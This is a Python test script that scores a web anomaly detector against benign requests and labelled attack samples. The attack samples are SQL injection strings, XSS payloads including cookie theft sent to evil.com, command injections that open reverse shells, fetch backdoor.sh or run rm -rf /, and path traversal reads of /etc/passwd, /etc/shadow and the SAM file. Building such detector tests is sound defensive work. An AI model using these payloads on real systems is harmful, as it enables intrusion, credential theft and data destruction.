"""
Comprehensive accuracy testing for anomaly detection
This validates Objective 3: "at least 80% detection accuracy"
"""

from anomaly_detection import AnomalyDetector
import time

def comprehensive_test():
    detector = AnomalyDetector()
    
    # ========================================
    # NORMAL TRAFFIC SAMPLES (50 samples)
    # ========================================
    normal_samples = [
        # Login attempts
        {'ip': '192.168.1.10', 'path': '/login', 'payload': 'username=john&password=pass123', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/login', 'payload': 'username=alice&password=secret456', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/login', 'payload': 'username=bob&password=mypass789', 'timestamp': time.time()},
        
        # Dashboard visits (most common)
        {'ip': '192.168.1.10', 'path': '/dashboard', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 5},
        {'ip': '192.168.1.12', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 10},
        {'ip': '192.168.1.10', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 15},
        {'ip': '192.168.1.13', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 20},
        
        # Monitor page
        {'ip': '192.168.1.10', 'path': '/monitor', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/monitor', 'payload': '', 'timestamp': time.time() + 7},
        
        # Profile updates
        {'ip': '192.168.1.10', 'path': '/profile', 'payload': 'name=John Doe&email=john@example.com', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/profile', 'payload': 'name=Alice Smith&bio=Developer', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/profile', 'payload': 'name=Bob Jones&phone=1234567890', 'timestamp': time.time()},
        
        # Search queries
        {'ip': '192.168.1.10', 'path': '/search', 'payload': 'query=cybersecurity', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/search', 'payload': 'query=web application', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/search', 'payload': 'query=firewall tutorial', 'timestamp': time.time()},
        {'ip': '192.168.1.13', 'path': '/search', 'payload': 'query=python programming', 'timestamp': time.time()},
        
        # API calls
        {'ip': '192.168.1.10', 'path': '/api/logs', 'payload': 'limit=50&offset=0', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/api/logs', 'payload': 'limit=100', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/api/logs', 'payload': 'type=SQL Injection', 'timestamp': time.time()},
        
        # Form submissions
        {'ip': '192.168.1.10', 'path': '/contact', 'payload': 'name=User&message=Hello world', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/feedback', 'payload': 'rating=5&comment=Great app', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/support', 'payload': 'issue=Login problem&description=Cannot access', 'timestamp': time.time()},
        
        # Homepage visits
        {'ip': '192.168.1.10', 'path': '/', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/', 'payload': '', 'timestamp': time.time() + 2},
        {'ip': '192.168.1.12', 'path': '/', 'payload': '', 'timestamp': time.time() + 4},
        
        # Logout
        {'ip': '192.168.1.10', 'path': '/logout', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/logout', 'payload': '', 'timestamp': time.time() + 3},
        
        # Settings updates
        {'ip': '192.168.1.10', 'path': '/settings', 'payload': 'theme=dark&language=en', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/settings', 'payload': 'notifications=true&privacy=strict', 'timestamp': time.time()},
        
        # File downloads
        {'ip': '192.168.1.10', 'path': '/download/report.pdf', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/download/data.csv', 'payload': '', 'timestamp': time.time()},
        
        # Password changes
        {'ip': '192.168.1.10', 'path': '/change-password', 'payload': 'old=pass123&new=newpass456', 'timestamp': time.time()},
        
        # Email verification
        {'ip': '192.168.1.10', 'path': '/verify', 'payload': 'token=abc123def456', 'timestamp': time.time()},
        
        # Image uploads
        {'ip': '192.168.1.10', 'path': '/upload', 'payload': 'file=avatar.jpg&size=50KB', 'timestamp': time.time()},
        
        # Calendar events
        {'ip': '192.168.1.10', 'path': '/calendar', 'payload': 'date=2025-11-07&event=Meeting', 'timestamp': time.time()},
        
        # Help page
        {'ip': '192.168.1.10', 'path': '/help', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/help/faq', 'payload': '', 'timestamp': time.time()},
        
        # About page
        {'ip': '192.168.1.10', 'path': '/about', 'payload': '', 'timestamp': time.time()},
        
        # Terms and privacy
        {'ip': '192.168.1.10', 'path': '/terms', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/privacy', 'payload': '', 'timestamp': time.time()},
        
        # Blog posts
        {'ip': '192.168.1.10', 'path': '/blog/cybersecurity-tips', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/blog/waf-guide', 'payload': '', 'timestamp': time.time()},
        
        # Comments
        {'ip': '192.168.1.10', 'path': '/comment', 'payload': 'post_id=123&text=Great article', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/comment', 'payload': 'post_id=124&text=Very helpful', 'timestamp': time.time()},
        
        # Shopping cart (if applicable)
        {'ip': '192.168.1.10', 'path': '/cart', 'payload': 'action=add&item_id=456', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/cart', 'payload': 'action=remove&item_id=457', 'timestamp': time.time()},
        
        # Checkout
        {'ip': '192.168.1.10', 'path': '/checkout', 'payload': 'total=99.99&method=credit', 'timestamp': time.time()},
    ]
    
    # ========================================
    # MALICIOUS TRAFFIC SAMPLES (50 samples)
    # ========================================
    malicious_samples = [
        # SQL Injection attempts (15)
        {'ip': '10.0.0.5', 'path': '/search', 'payload': "query=' OR '1'='1' --", 'timestamp': time.time()},
        {'ip': '10.0.0.5', 'path': '/search', 'payload': "query=1' UNION SELECT null,username,password FROM users--", 'timestamp': time.time()},
        {'ip': '10.0.0.5', 'path': '/login', 'payload': "username=admin'--&password=anything", 'timestamp': time.time()},
        {'ip': '10.0.0.6', 'path': '/product', 'payload': "id=1' AND 1=1--", 'timestamp': time.time()},
        {'ip': '10.0.0.6', 'path': '/user', 'payload': "id=1' OR '1'='1", 'timestamp': time.time()},
        {'ip': '10.0.0.7', 'path': '/search', 'payload': "query='; DROP TABLE users--", 'timestamp': time.time()},
        {'ip': '10.0.0.7', 'path': '/api', 'payload': "param=1' UNION ALL SELECT database(),user(),@@version--", 'timestamp': time.time()},
        {'ip': '10.0.0.8', 'path': '/filter', 'payload': "category=books' OR 1=1 LIMIT 1--", 'timestamp': time.time()},
        {'ip': '10.0.0.8', 'path': '/report', 'payload': "id=1'; EXEC xp_cmdshell('dir')--", 'timestamp': time.time()},
        {'ip': '10.0.0.9', 'path': '/search', 'payload': "q=test' AND SLEEP(5)--", 'timestamp': time.time()},
        {'ip': '10.0.0.9', 'path': '/data', 'payload': "filter=1' AND BENCHMARK(5000000,MD5('A'))--", 'timestamp': time.time()},
        {'ip': '10.0.0.10', 'path': '/view', 'payload': "id=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", 'timestamp': time.time()},
        {'ip': '10.0.0.10', 'path': '/page', 'payload': "id=1' UNION SELECT NULL,NULL,NULL,NULL,NULL--", 'timestamp': time.time()},
        {'ip': '10.0.0.11', 'path': '/search', 'payload': "q=admin' AND extractvalue(1,concat(0x7e,database()))--", 'timestamp': time.time()},
        {'ip': '10.0.0.11', 'path': '/login', 'payload': "user=' OR '1'='1'/*&pass=anything", 'timestamp': time.time()},
        
        # XSS attempts (15)
        {'ip': '10.0.0.12', 'path': '/search', 'payload': 'query=<script>alert(1)</script>', 'timestamp': time.time()},
        {'ip': '10.0.0.12', 'path': '/comment', 'payload': 'text=<script>document.location="http://evil.com"</script>', 'timestamp': time.time()},
        {'ip': '10.0.0.13', 'path': '/profile', 'payload': 'name=<img src=x onerror=alert(1)>', 'timestamp': time.time()},
        {'ip': '10.0.0.13', 'path': '/post', 'payload': 'content=<svg/onload=alert("xss")>', 'timestamp': time.time()},
        {'ip': '10.0.0.14', 'path': '/message', 'payload': 'text=<iframe src="javascript:alert(1)"></iframe>', 'timestamp': time.time()},
        {'ip': '10.0.0.14', 'path': '/feedback', 'payload': 'comment=<body onload=alert("XSS")>', 'timestamp': time.time()},
        {'ip': '10.0.0.15', 'path': '/search', 'payload': 'q=<script>fetch("http://evil.com?cookie="+document.cookie)</script>', 'timestamp': time.time()},
        {'ip': '10.0.0.15', 'path': '/input', 'payload': 'data="><script>alert(String.fromCharCode(88,83,83))</script>', 'timestamp': time.time()},
        {'ip': '10.0.0.16', 'path': '/form', 'payload': 'field=<img src=x:alert(1) onerror=eval(src)>', 'timestamp': time.time()},
        {'ip': '10.0.0.16', 'path': '/update', 'payload': 'bio=<object data="javascript:alert(1)">', 'timestamp': time.time()},
        {'ip': '10.0.0.17', 'path': '/comment', 'payload': 'text=<details open ontoggle=alert(1)>', 'timestamp': time.time()},
        {'ip': '10.0.0.17', 'path': '/post', 'payload': 'content=<marquee onstart=alert(1)>', 'timestamp': time.time()},
        {'ip': '10.0.0.18', 'path': '/search', 'payload': 'q=<svg><script>alert(1)</script></svg>', 'timestamp': time.time()},
        {'ip': '10.0.0.18', 'path': '/input', 'payload': 'name=<input onfocus=alert(1) autofocus>', 'timestamp': time.time()},
        {'ip': '10.0.0.19', 'path': '/message', 'payload': 'text=<select onfocus=alert(1) autofocus>', 'timestamp': time.time()},
        
        # Command Injection (10)
        {'ip': '10.0.0.20', 'path': '/exec', 'payload': 'cmd=; cat /etc/passwd', 'timestamp': time.time()},
        {'ip': '10.0.0.20', 'path': '/run', 'payload': 'command=| ls -la', 'timestamp': time.time()},
        {'ip': '10.0.0.21', 'path': '/api/exec', 'payload': 'input=`whoami`', 'timestamp': time.time()},
        {'ip': '10.0.0.21', 'path': '/system', 'payload': 'cmd=$(id)', 'timestamp': time.time()},
        {'ip': '10.0.0.22', 'path': '/ping', 'payload': 'host=127.0.0.1; nc -e /bin/bash attacker.com 4444', 'timestamp': time.time()},
        {'ip': '10.0.0.22', 'path': '/diag', 'payload': 'tool=traceroute && wget http://evil.com/backdoor.sh', 'timestamp': time.time()},
        {'ip': '10.0.0.23', 'path': '/cmd', 'payload': 'exec=127.0.0.1 | bash -i >& /dev/tcp/10.0.0.1/8080 0>&1', 'timestamp': time.time()},
        {'ip': '10.0.0.23', 'path': '/shell', 'payload': 'input=; rm -rf /', 'timestamp': time.time()},
        {'ip': '10.0.0.24', 'path': '/execute', 'payload': 'cmd=python -c "import os; os.system(\\"ls\\")"', 'timestamp': time.time()},
        {'ip': '10.0.0.24', 'path': '/run', 'payload': 'command=perl -e "exec \\"/bin/bash\\""', 'timestamp': time.time()},
        
        # Directory Traversal (10)
        {'ip': '10.0.0.25', 'path': '/files', 'payload': 'path=../../../../etc/passwd', 'timestamp': time.time()},
        {'ip': '10.0.0.25', 'path': '/download', 'payload': 'file=..\\..\\..\\windows\\system32\\config\\sam', 'timestamp': time.time()},
        {'ip': '10.0.0.26', 'path': '/include', 'payload': 'page=php://filter/resource=/etc/passwd', 'timestamp': time.time()},
        {'ip': '10.0.0.26', 'path': '/read', 'payload': 'file=....//....//....//etc/shadow', 'timestamp': time.time()},
        {'ip': '10.0.0.27', 'path': '/view', 'payload': 'doc=../../../../../../proc/self/environ', 'timestamp': time.time()},
        {'ip': '10.0.0.27', 'path': '/show', 'payload': 'file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'timestamp': time.time()},
        {'ip': '10.0.0.28', 'path': '/get', 'payload': 'path=..%252f..%252f..%252fetc%252fpasswd', 'timestamp': time.time()},
        {'ip': '10.0.0.28', 'path': '/load', 'payload': 'file=c:\\windows\\win.ini', 'timestamp': time.time()},
        {'ip': '10.0.0.29', 'path': '/open', 'payload': 'doc=/var/www/../../etc/passwd', 'timestamp': time.time()},
        {'ip': '10.0.0.29', 'path': '/fetch', 'payload': 'resource=file:///etc/passwd', 'timestamp': time.time()},
    ]
    
    # Train baseline on normal traffic
    print("Training anomaly detector on normal traffic baseline...")
    detector.train_baseline(normal_samples[:30])  # Use first 30 for training
    print()
    
    # ========================================
    # RUN TESTS
    # ========================================
    true_positives = 0   # Correctly identified attacks
    false_positives = 0  # Normal flagged as attack
    true_negatives = 0   # Correctly identified normal
    false_negatives = 0  # Missed attacks
    
    print("="*70)
    print("TESTING NORMAL TRAFFIC (Last 20 samples not used in training)")
    print("="*70)
    for i, sample in enumerate(normal_samples[30:], 1):
        is_anom, score, details = detector.is_anomalous(sample, threshold=75)
        if is_anom:
            false_positives += 1
            print(f"❌ FALSE POSITIVE #{i}: {sample['path']} (Score: {score})")
            print(f"   Details: {details}")
        else:
            true_negatives += 1
            print(f"✅ TRUE NEGATIVE #{i}: {sample['path']} (Score: {score})")
    
    print("\n" + "="*70)
    print("TESTING MALICIOUS TRAFFIC (50 attack samples)")
    print("="*70)
    for i, sample in enumerate(malicious_samples, 1):
        is_anom, score, details = detector.is_anomalous(sample, threshold=75)
        if is_anom:
            true_positives += 1
            print(f"✅ TRUE POSITIVE #{i}: {sample['path']} (Score: {score})")
        else:
            false_negatives += 1
            print(f"❌ FALSE NEGATIVE #{i}: {sample['path']} (Score: {score})")
            print(f"   Payload: {sample['payload'][:50]}...")
    
    # ========================================
    # CALCULATE METRICS
    # ========================================
    total = true_positives + false_positives + true_negatives + false_negatives
    accuracy = (true_positives + true_negatives) / total * 100 if total > 0 else 0
    precision = true_positives / (true_positives + false_positives) * 100 if (true_positives + false_positives) > 0 else 0
    recall = true_positives / (true_positives + false_negatives) * 100 if (true_positives + false_negatives) > 0 else 0
    f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
    specificity = true_negatives / (true_negatives + false_positives) * 100 if (true_negatives + false_positives) > 0 else 0
    
    # ========================================
    # DISPLAY RESULTS
    # ========================================
    print("\n" + "="*70)
    print("CONFUSION MATRIX")
    print("="*70)
    print(f"                    Predicted Positive  |  Predicted Negative")
    print(f"Actual Positive     TP: {true_positives:3d}             |  FN: {false_negatives:3d}")
    print(f"Actual Negative     FP: {false_positives:3d}             |  TN: {true_negatives:3d}")
    
    print("\n" + "="*70)
    print("ANOMALY DETECTION PERFORMANCE METRICS")
    print("="*70)
    print(f"Total Test Cases:    {total}")
    print(f"True Positives:      {true_positives:3d}  (Attacks correctly detected)")
    print(f"False Positives:     {false_positives:3d}  (Normal traffic wrongly blocked)")
    print(f"True Negatives:      {true_negatives:3d}  (Normal traffic correctly allowed)")
    print(f"False Negatives:     {false_negatives:3d}  (Attacks missed)")
    print("-"*70)
    print(f"Accuracy:            {accuracy:.2f}%  ✓ Target: ≥80%")
    print(f"Precision:           {precision:.2f}%  (When we block, how often correct?)")
    print(f"Recall (Sensitivity):{recall:.2f}%  (What % of attacks we catch?)")
    print(f"Specificity:         {specificity:.2f}%  (What % of normal traffic we allow?)")
    print(f"F1-Score:            {f1_score:.2f}%  (Balance of precision & recall)")
    print("="*70)
    
    # ========================================
    # VERDICT
    # ========================================
    print("\n" + "="*70)
    if accuracy >= 80:
        print("✅ OBJECTIVE 3 SUCCESSFULLY MET!")
        print(f"   Anomaly detection achieved {accuracy:.2f}% accuracy (≥80% required)")
    else:
        print("⚠️  OBJECTIVE 3 NOT MET")
        print(f"   Anomaly detection achieved {accuracy:.2f}% accuracy (need ≥80%)")
        print("\n   RECOMMENDATIONS:")
        print("   1. Adjust anomaly threshold (currently 75)")
        print("   2. Add more training samples")
        print("   3. Fine-tune baseline parameters")
        print("   4. Combine with pattern matching for better coverage")
    print("="*70)
    
    return {
        'accuracy': accuracy,
        'precision': precision,
        'recall': recall,
        'f1_score': f1_score,
        'specificity': specificity,
        'tp': true_positives,
        'fp': false_positives,
        'tn': true_negatives,
        'fn': false_negatives
    }

if __name__ == '__main__':
    results = comprehensive_test()